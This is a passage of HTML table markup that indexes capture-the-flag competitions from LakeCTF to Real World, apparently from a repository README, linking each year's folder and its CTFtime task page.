<td><a href=\"ctfs/LakeCTF/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2069/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LakeCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1728/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Layer7\">Layer7</a></td>\n            <td><a href=\"ctfs/Layer7/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1179/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Layer7/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/895/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/LedgerDonjon\">Ledger Donjon</a></td>\n            <td><a href=\"ctfs/LedgerDonjon/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1516/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LedgerDonjon/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1173/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/MCTF\">MCTF</a></td>\n            <td><a href=\"ctfs/MCTF/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2534/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MCTF/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2096/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MCTF/2023-Junior/Quals\">2023-Junior Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2095/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MCTF/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1784/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MCTF/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1439/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MCTF/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1138/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/MUST\">MUST</a></td>\n            <td><a href=\"ctfs/MUST/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2175/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/MeePwn\">MeePwn</a></td>\n            <td><a href=\"ctfs/MeePwn/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/625/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/MeePwn/2018/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/MaltaCTF\">MaltaCTF</a></td>\n            <td><a href=\"ctfs/MaltaCTF/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2776/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/MapleCTF\">MapleCTF</a></td>\n            <td><a href=\"ctfs/MapleCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2038/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MapleCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1676/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Mapna\">Mapna</a></td>\n            <td><a href=\"ctfs/Mapna/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2205/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/MetaCTF\">MetaCTF</a></td>\n            <td><a href=\"ctfs/MetaCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1476/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MetaCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1106/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/MetaRed\">MetaRed</a></td>\n            <td><a href=\"ctfs/MetaRed/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2537/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MetaRed/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1750/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MetaRed/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1420/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/MidnightFlag\">Midnight Flag</a></td>\n            <td><a href=\"ctfs/MidnightFlag/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2295/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MidnightFlag/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1947/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/MidnightSun\">Midnight Sun</a></td>\n            <td><a href=\"ctfs/MidnightSun/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2247/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MidnightSun/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1474/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MidnightSun/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1139/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MidnightSun/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/935/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/MidnightSun/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/751/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/N0PSctf\">N0PSctf</a></td>\n            <td><a href=\"ctfs/N0PSctf/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2486/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/N0PSctf/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2358/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/N1CTF\">N1CTF</a></td>\n            <td><a href=\"ctfs/N1CTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2459/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/N1CTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2062/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/N1CTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1759/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/N1CTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1367/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/N1CTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1099/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/N1CTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/768/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/N1CTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/584/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/NNS\">NNS</a></td>\n            <td><a href=\"ctfs/NNS/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2684/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/NACTF\">NACTF</a></td>\n            <td><a href=\"ctfs/NACTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1157/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/NewYear\">NewYear</a></td>\n            <td><a href=\"ctfs/NewYear/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2218/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/NewportBlakeCTF\">NewportBlakeCTF</a></td>\n            <td><a href=\"ctfs/NewportBlakeCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2072/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Nexus\">Nexus</a></td>\n            <td><a href=\"ctfs/Nexus/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2331/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/NOESCAPE\">NOESCAPE</a></td>\n            <td><a href=\"ctfs/NOESCAPE/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1822/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/NTUA_H4CK\">NOESCAPE</a></td>\n            <td><a href=\"ctfs/NTUA_H4CK/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2571/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/NahamCon\">NahamCon</a></td>\n            <td><a href=\"ctfs/NahamCon/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2782/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/NahamCon/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2364/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/NahamCon/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2023/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/NahamCon/2022-EU\">2022-EU</a></td>\n            <td><a href=\"https://ctftime.org/event/1843/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/NahamCon/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1630/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/NahamCon/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1281/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/NahamCon/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1067/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/NoHackNoCTF\">NoHackNoCTF</a></td>\n            <td><a href=\"ctfs/NoHackNoCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2818/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/NoHackNoCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2574/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Norzh\">Norzh</a></td>\n            <td><a href=\"ctfs/Norzh/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1301/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Nowruz\">Nowruz</a></td>\n            <td><a href=\"ctfs/Nowruz/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2601/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/NuitduHack\">Nuit du Hack</a></td>\n            <td><a href=\"ctfs/NuitduHack/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/583/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/niteCTF\">niteCTF</a></td>\n            <td><a href=\"ctfs/niteCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2461/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/niteCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2207/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/niteCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1758/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/niteCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1449/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/OFPPT\">OFPPT</a></td>\n            <td><a href=\"ctfs/OFPPT/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1605/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/OMH\">OMH</a></td>\n            <td><a href=\"ctfs/OMH/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1363/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/OSCTF\">OSCTF</a></td>\n            <td><a href=\"ctfs/OSCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2416/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/OverTheWireAdventBonanza\">OverTheWire Advent Bonanza</a></td>\n            <td><a href=\"ctfs/OverTheWireAdventBonanza/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1503/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/OverTheWireAdventBonanza/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/721/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/PBjar\">PBjar</a></td>\n            <td><a href=\"ctfs/PBjar/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1430/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/P.W.N\">P.W.N</a></td>\n            <td><a href=\"ctfs/P.W.N/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/639/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Paradigm\">Paradigm</a></td>\n            <td><a href=\"ctfs/Paradigm/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2151/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Paradigm/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1719/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/PatriotCTF\">PatriotCTF</a></td>\n            <td><a href=\"ctfs/PatriotCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2426/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PatriotCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2030/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PatriotCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1616/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Pearl\">Pearl</a></td>\n            <td><a href=\"ctfs/Pearl/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2231/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=8><a href=\"ctfs/PlaidCTF\">Plaid</a></td>\n            <td><a href=\"ctfs/PlaidCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2508/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PlaidCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2245/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PlaidCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1770/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PlaidCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1542/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PlaidCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1199/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PlaidCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/936/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PlaidCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/743/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PlaidCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/617/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/PlaidCTF/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Platypwn\">Platypwn</a></td>\n            <td><a href=\"ctfs/Platypwn/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2407/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Platypwn/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2082/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/PointerOverflow\">PointerOverflow</a></td>\n            <td><a href=\"ctfs/PointerOverflow/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2121/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/PointerOverflow/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2026/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/PoseidonCTF\">Poseidon</a></td>\n            <td><a href=\"ctfs/PoseidonCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1049/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Potluck\">Potluck</a></td>\n            <td><a href=\"ctfs/Potluck/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2199/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/Pragyan\">Pragyan</a></td>\n            <td><a href=\"ctfs/Pragyan/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2608/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Pragyan/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1931/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Pragyan/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1330/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Pragyan/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/755/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/Pwn2Win\">Pwn2Win</a></td>\n            <td><a href=\"ctfs/Pwn2Win/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1186/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Pwn2Win/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/961/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Pwn2Win/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/822/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Pwn2Win/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/664/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/PwnMeCTF\">PwnMeCTF</a></td>\n            <td><a href=\"ctfs/PwnMeCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2658/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/PwnSec\">PwnSec</a></td>\n            <td><a href=\"ctfs/PwnSec/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2454/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/PwnThyBytes\">PwnThyBytes</a></td>\n            <td><a href=\"ctfs/PwnThyBytes/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/756/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Pwnme\">Pwnme</a></td>\n            <td><a href=\"ctfs/Pwnme/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1691/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/QUESTCON\">QUESTCON</a></td>\n            <td><a href=\"ctfs/QUESTCON/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2505/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/QUESTCON/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2141/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/QnQSec\">QnQSec</a></td>\n            <td><a href=\"ctfs/QnQSec/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2826/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/R3CTF\">R3CTF</a></td>\n            <td><a href=\"ctfs/R3CTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2731/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/R3CTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2273/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/RACTF\">RACTF</a></td>\n            <td><a href=\"ctfs/RACTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1354/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RACTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1051/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/RCTF\">RCTF</a></td>\n            <td><a href=\"ctfs/RCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1806/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1413/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1045/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/812/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/624/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/RCTF/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/RITSEC\">RITSEC</a></td>\n            <td><a href=\"ctfs/RITSEC/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2673/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RITSEC/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2291/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RITSEC/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1860/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RITSEC/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1558/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RITSEC/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1309/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RITSEC/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/898/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RITSEC/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/682/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/RTL\">RTL</a></td>\n            <td><a href=\"ctfs/RTL/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1400/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/RVCExIITBxYCF\">RVCExIITBxYCF</a></td>\n            <td><a href=\"ctfs/RVCExIITBxYCF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2385/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/RaRCTF\">RaRCTF</a></td>\n            <td><a href=\"ctfs/RaRCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1342/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/RaziCTF\">Razi</a></td>\n            <td><a href=\"ctfs/RaziCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1167/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/RealWorld\">Real World</a></td>\n            <td><a href=\"ctfs/RealWorld/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2172/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RealWorld/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1797/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/RealWorld/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1507/tasks/\" target=\"_blank\">CTFtime</a></td>\n        